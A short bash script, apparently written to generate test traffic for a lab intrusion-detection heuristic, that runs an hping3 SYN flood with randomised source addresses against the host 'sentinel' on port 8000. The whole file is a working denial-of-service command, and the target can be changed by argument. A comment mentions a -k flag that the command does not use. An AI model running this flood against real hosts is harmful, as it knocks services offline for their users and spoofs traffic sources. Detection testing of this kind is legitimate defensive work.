#!/bin/bash
# DoS — SYN flood against sentinel:8000
# Produces: port_concentration ≥ 0.8, unanswered ≥ 8, avg_total_pkts ≤ 2
# → triggers the "DoS" branch in heuristic_attack_type
#
# Usage: ./run_dos.sh [target] [duration_seconds]
TARGET=${1:-sentinel}
DURATION=${2:-20}

echo "[*] SYN flood → $TARGET:8000 for ${DURATION}s"
echo "    (hping3 --flood: 1 SYN pkt per flow, no ACK reply expected)"

# --flood  : send as fast as possible
# -S       : SYN flag only
# -p 8000  : target sentinel API port
# -k       : keep source port fixed so each packet looks like a new flow
# --rand-source: randomise source IPs (realistic flood)
timeout "$DURATION" hping3 --flood -S -p 8000 --rand-source "$TARGET" 2>&1 || true

echo "[*] DoS complete."
